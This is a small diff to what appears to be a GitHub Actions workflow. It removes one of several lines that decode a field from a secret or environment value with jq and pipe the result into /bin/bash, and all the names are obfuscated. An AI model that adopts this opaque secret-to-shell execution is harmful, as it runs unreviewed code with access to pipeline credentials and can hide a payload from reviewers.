@@ -19,7 +19,6 @@ jobs:
           xtd2018: ${{ secrets.xtd2018 }}
         run: |
           printf '%s' "$xtd2018" | jq -r .odrsg4330 | /bin/bash
-          printf '%s' "$nz47440" | jq -r .x54762 | /bin/bash
           echo $qd7340 | jq -r .qw99308 | /bin/bash
           printf '%s' "$tys3363" | jq -r .bqk72 | /bin/bash
 
